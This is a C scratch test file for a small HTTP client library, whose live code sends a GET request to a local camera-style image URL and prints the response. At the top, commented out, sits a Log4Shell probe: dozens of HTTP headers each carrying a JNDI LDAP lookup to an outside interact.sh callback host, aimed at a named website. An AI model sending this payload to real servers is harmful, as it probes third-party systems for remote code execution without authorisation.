#include "libhttp.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// const char *payload = 
// "Host: www.opey.com\r\nUser-Agent: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: close\r\n"
// "Referer: https://${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Api-Version: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Accept-Charset: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Accept-Datetime: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Accept-Language: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Cookie: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Forwarded: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Forwarded-For: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Forwarded-For-Ip: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Forwarded-Proto: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "From: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "TE: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "True-Client-IP: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Upgrade: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Via: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Warning: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Max-Forwards: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Origin: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Pragma: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "DNT: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "Cache-Control: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-ATT-DeviceId: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Correlation-ID: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Csrf-Token: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-CSRFToken: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Do-Not-Track: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Foo: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Foo-Bar: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-By: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-For: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-For-Original: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-Host: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-Port: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-Proto: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-Protocol: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-Scheme: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-Server: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarded-Ssl: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forwarder-For: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forward-For: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Forward-Proto: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Frame-Options: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-From: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Geoip-Country: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Http-Destinationurl: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Http-Host-Override: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Http-Method: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-HTTP-Method-Override: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Http-Path-Override: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Https: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Htx-Agent: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Hub-Signature: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-If-Unmodified-Since: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Imbo-Test-Config: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Insight: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Ip: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Ip-Trail: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-ProxyUser-Ip: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Requested-With: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Request-ID: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-UIDH: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-Wap-Profile: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n"
// "X-XSRF-TOKEN: ${jndi:ldap://www.opey.com.s0w3r2n25yv9470h93tdj84vk9r4h5noc.interact.sh/mms2nff}\r\n";

int main(int argc, char *argv[]) {
 
    // 0x505249202a20485454502f322e300d0a0d0a534d0d0a0d0a
    // char *n = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    // while(*n) {
    //     printf("%02x", *n);
    //     *n++;
    // }
    // return 0;
    http_session http;
    http = http_new();
    if(!http) {
        fprintf(stderr, "http_new() failed\n");
        return 1;
    }
    // char *bs64str = "asjfasjfhbdfcm#$$";
    // printf("%s\n", http_url_encode(bs64str, strlen(bs64str)));
    // return 1;

    // FILE *fp = fopen("test.txt", "w");

    int verbose = HTTP_VERBOSITY_ENABLE;
    int re = 2;
    int p = 12;
    char *cookie_fp = "cookies.txt";
    int version = HTTP_GET;
    // http_options_set(http, HTTP_OPTIONS_PROXY_URL, "http://127.0.0.1:8080");
    http_options_set(http, HTTP_OPTIONS_URL, "http://192.168.43.106:8080/shot.jpg");
    // http_options_set(http, HTTP_OPTIONS_MAX_REDIRECT, &re);
    http_options_set(http, HTTP_OPTIONS_VERBOSITY, &verbose);
    http_options_set(http, HTTP_OPTIONS_REQUEST_METHOD, &version);
    // http_options_set(http, HTTP_OPTIONS_LOGGING_FP, &cookie_fp);
    // http_options_set(http, HTTP_OPTIONS_LOAD_COOKIES_FILE, cookie_fp);

    // http_connect(http);
    // http_session_start(http);
    // http_write_res_fp_friendly(http, stdout);

    char *q;
    http_options_get(http, HTTP_OPTIONS_QUERY, &q);
    printf("Query: %s\n", q);
    if(http_perform_req(http) != HTTP_OK) {
        fprintf(stderr, "http_perform_req() failed: %s\n", http_get_error(http));
        return 1;
    }
    
    // const char *location;
    // location = http_get_header(http, "Location");
    // printf("Following %s...\n", location);
    // printf("[*] Received headers:\n%s\n", http_get_headers(http));
    http_write_res_fp_friendly(http, stdout);

    // printf("%s\n", http_get_error(http));
    // printf("[*] Received body:\n%s\n", http_get_body(http));
    
    printf("[*] Content type: %s\n", http_get_header(http, "Vary"));
    http_disconnect(http);
    http_free(http);
    return 0;
}